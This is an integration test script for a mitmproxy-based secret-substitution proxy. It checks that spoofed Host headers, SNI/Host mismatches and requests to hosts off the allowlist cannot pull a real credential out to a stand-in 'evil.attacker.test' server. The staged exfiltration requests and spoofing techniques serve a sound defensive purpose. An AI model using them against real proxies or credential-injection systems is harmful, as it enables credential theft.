#!/usr/bin/env bash
# End-to-end test of the secrets layer in its real topology: containers on a
# bridge, nftables REDIRECT, mitmproxy in TRANSPARENT mode, the actual addon.
#
# Unit tests construct flows by hand and can only check the addon's reasoning.
# The exfiltration this guards against was a disagreement between the addon's
# reasoning and where mitmproxy actually sent the bytes -- which only shows up
# when real packets move. So this test stands up an attacker-controlled server,
# points a container at it, and looks at what the attacker received.
#
# Needs: root, nft, docker, python3 with mitmproxy. Skips cleanly without them.
set -uo pipefail
ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)
# shellcheck source=../../lib/harness.sh
. "$ROOT/tests/lib/harness.sh"

NET=desolate-proxytest
BRIDGE=br-proxytest              # <= 15 chars (IFNAMSIZ)
SUBNET=172.30.44.0/24
GW=172.30.44.1
SRV_IP=172.30.44.5
NFT_TABLE=desolate_proxytest
PORT=18099
PY_IMAGE="${DESOLATE_TEST_PY_IMAGE:-python:3.12-slim}"

PLACEHOLDER="DESOLATE-INTEGRATION-PLACEHOLDER"
REAL="REAL-SECRET-VALUE-must-never-leave"
ALLOWED_HOST="api.allowed.test"

need() { command -v "$1" >/dev/null 2>&1; }

if [ "$(id -u)" != 0 ]; then skip "proxy integration" "needs root (nftables)"; summary; exit $?; fi
if ! need nft; then skip "proxy integration" "nft not installed"; summary; exit $?; fi
if ! docker info >/dev/null 2>&1; then skip "proxy integration" "no docker daemon"; summary; exit $?; fi

MITM=""
for c in "${DESOLATE_MITMDUMP:-}" /opt/desolate-proxy/venv/bin/mitmdump /opt/mitmtest/bin/mitmdump mitmdump; do
  [ -n "$c" ] || continue
  if [ -x "$c" ] || need "$c"; then MITM="$c"; break; fi
done
if [ -z "$MITM" ]; then
  skip "proxy integration" "no mitmdump (pip install 'mitmproxy==11.0.2')"
  summary; exit $?
fi

WORK=$(mktemp -d)
MITM_PID=""

cleanup() {
  [ -n "$MITM_PID" ] && kill "$MITM_PID" 2>/dev/null
  nft delete table inet "$NFT_TABLE" 2>/dev/null
  docker rm -f "$NET-attacker" "$NET-legit" >/dev/null 2>&1
  docker network rm "$NET" >/dev/null 2>&1
  rm -rf "$WORK"
}
trap cleanup EXIT INT TERM

# --- fixtures --------------------------------------------------------------
cat > "$WORK/settings.json" <<EOF
{
  "default_action": "allow",
  "secrets": { "$PLACEHOLDER": { "value": "$REAL", "hosts": ["$ALLOWED_HOST"] } },
  "network": [ { "action": "allow", "host": "*" } ],
  "scrub_responses": true
}
EOF

# A server that records exactly what reached it. Serves plain HTTP or TLS.
cat > "$WORK/server.py" <<'PY'
import http.server, ssl, sys
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n".join([f"PATH {self.path}"] + [f"HDR {k}: {v}" for k, v in self.headers.items()]), flush=True)
        self.send_response(200); self.send_header("Content-Type", "text/plain")
        self.end_headers(); self.wfile.write(b"ok\n")
    def log_message(self, *a): pass
port = int(sys.argv[1]); srv = http.server.HTTPServer(("0.0.0.0", port), H)
if len(sys.argv) > 2:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(sys.argv[2])
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
srv.serve_forever()
PY

# A client that chooses its TCP destination, its SNI and its Host header
# independently -- which is the whole point.
cat > "$WORK/client.py" <<'PY'
import http.client, socket, ssl, sys
ip, scheme, sni, host_hdr, placeholder = sys.argv[1:6]
try:
    if scheme == "https":
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        c = http.client.HTTPSConnection(ip, 443, timeout=20, context=ctx)
        c.sock = ctx.wrap_socket(socket.create_connection((ip, 443), timeout=20), server_hostname=sni)
    else:
        c = http.client.HTTPConnection(ip, 80, timeout=20)
    c.request("GET", "/probe", headers={"Host": host_hdr,
                                        "Authorization": f"Bearer {placeholder}"})
    r = c.getresponse()
    print(f"STATUS {r.status}")
except Exception as e:
    print(f"STATUS ERR {type(e).__name__}: {e}")
PY

# A CA the proxy will trust, standing in for "the attacker has a real
# certificate for a domain they legitimately own".
openssl req -x509 -newkey rsa:2048 -keyout "$WORK/ca.key" -out "$WORK/ca.pem" -days 1 -nodes \
  -subj "/CN=desolate integration CA" >/dev/null 2>&1
issue() { # issue <cn> -> $WORK/<cn>.pem
  openssl req -newkey rsa:2048 -keyout "$WORK/$1.key" -out "$WORK/$1.csr" -nodes \
    -subj "/CN=$1" >/dev/null 2>&1
  printf 'subjectAltName=DNS:%s,IP:%s\n' "$1" "$SRV_IP" > "$WORK/$1.ext"
  openssl x509 -req -in "$WORK/$1.csr" -CA "$WORK/ca.pem" -CAkey "$WORK/ca.key" -CAcreateserial \
    -out "$WORK/$1.crt" -days 1 -extfile "$WORK/$1.ext" >/dev/null 2>&1
  cat "$WORK/$1.crt" "$WORK/$1.key" > "$WORK/$1.pem"
}
issue "evil.attacker.test"
issue "$ALLOWED_HOST"
chmod -R a+rX "$WORK"

# --- topology --------------------------------------------------------------
docker network rm "$NET" >/dev/null 2>&1
docker network create --opt "com.docker.network.bridge.name=$BRIDGE" --subnet "$SUBNET" "$NET" >/dev/null \
  || { fail "create test network"; summary; exit 1; }

# The same interception rule the VM installs, scoped to the test bridge.
nft delete table inet "$NFT_TABLE" 2>/dev/null
nft -f - <<EOF || { fail "install nftables redirect"; summary; exit 1; }
table inet $NFT_TABLE {
    chain prerouting {
        type nat hook prerouting priority dstnat; policy accept;
        iifname "$BRIDGE" ip daddr != $GW tcp dport { 80, 443 } redirect to :$PORT
    }
}
EOF

DESOLATE_SETTINGS="$WORK/settings.json" "$MITM" \
  --mode transparent --listen-host 0.0.0.0 --listen-port "$PORT" \
  --set confdir="$WORK/confdir" --set block_global=false \
  --set ssl_verify_upstream_trusted_ca="$WORK/ca.pem" \
  -s "$RELEASE/proxy/vm/addon.py" > "$WORK/mitm.log" 2>&1 &
MITM_PID=$!
for _ in $(seq 1 30); do grep -q "listening" "$WORK/mitm.log" 2>/dev/null && break; sleep 0.5; done
if ! grep -q "listening" "$WORK/mitm.log" 2>/dev/null; then
  fail "mitmproxy started" "$(tail -5 "$WORK/mitm.log")"; summary; exit 1
fi
pass "mitmproxy started in transparent mode with the addon loaded"
assert_not_contains "the addon loaded without error" "$(cat "$WORK/mitm.log")" "Traceback"

start_server() { # start_server <name> <pem|"">
  # Only one container can hold SRV_IP, so clear both roles before binding it.
  docker rm -f "$NET-attacker" "$NET-legit" >/dev/null 2>&1
  if [ -n "$2" ]; then
    docker run -d --name "$1" --network "$NET" --ip "$SRV_IP" -v "$WORK:/w:ro" \
      "$PY_IMAGE" python /w/server.py 443 "/w/$2" >/dev/null
  else
    docker run -d --name "$1" --network "$NET" --ip "$SRV_IP" -v "$WORK:/w:ro" \
      "$PY_IMAGE" python /w/server.py 80 >/dev/null
  fi
  sleep 2
}

probe() { # probe <scheme> <sni> <host-header>
  docker run --rm --network "$NET" -v "$WORK:/w:ro" "$PY_IMAGE" \
    python /w/client.py "$SRV_IP" "$1" "$2" "$3" "$PLACEHOLDER" 2>&1 | grep '^STATUS' | head -1
}

received() { docker logs "$1" 2>&1; }

# ===========================================================================
group "the attacker must never receive the real value"
# ===========================================================================

# ATTACK 1 -- plaintext, spoofed Host. Verified to leak the real key before the
# addon stopped trusting the Host header.
start_server "$NET-attacker" ""
S=$(probe http "" "$ALLOWED_HOST")
assert_contains "plaintext Host-spoof is refused" "$S" "STATUS 403"
assert_not_contains "attacker did not receive the real secret (http)" "$(received "$NET-attacker")" "$REAL"

# ATTACK 2 -- TLS with a certificate the proxy trusts, but SNI != Host.
start_server "$NET-attacker" "evil.attacker.test.pem"
S=$(probe https "evil.attacker.test" "$ALLOWED_HOST")
assert_contains "TLS SNI/Host mismatch is refused" "$S" "STATUS 403"
assert_not_contains "attacker did not receive the real secret (tls)" "$(received "$NET-attacker")" "$REAL"

# ATTACK 3 -- honest about the destination, but it is not on the allowlist.
start_server "$NET-attacker" "evil.attacker.test.pem"
S=$(probe https "evil.attacker.test" "evil.attacker.test")
assert_contains "placeholder toward a non-allowlisted host is refused" "$S" "STATUS 403"
assert_not_contains "attacker received nothing (allowlist)" "$(received "$NET-attacker")" "$REAL"

# ===========================================================================
group "the allowlisted destination must still work"
# ===========================================================================

start_server "$NET-legit" "$ALLOWED_HOST.pem"
S=$(probe https "$ALLOWED_HOST" "$ALLOWED_HOST")
assert_contains "allowlisted request succeeds" "$S" "STATUS 200"
assert_contains "the real value was substituted in flight" "$(received "$NET-legit")" "$REAL"
assert_not_contains "the placeholder did not travel verbatim" "$(received "$NET-legit")" "Bearer $PLACEHOLDER"

# ===========================================================================
group "the proxy log tells the truth about what it did"
# ===========================================================================
LOG=$(cat "$WORK/mitm.log")
assert_contains "leak attempts are logged" "$LOG" "LEAK"
assert_contains "substitutions are logged" "$LOG" "SUBST"
assert_not_contains "the log never contains the real value" "$LOG" "$REAL"

summary
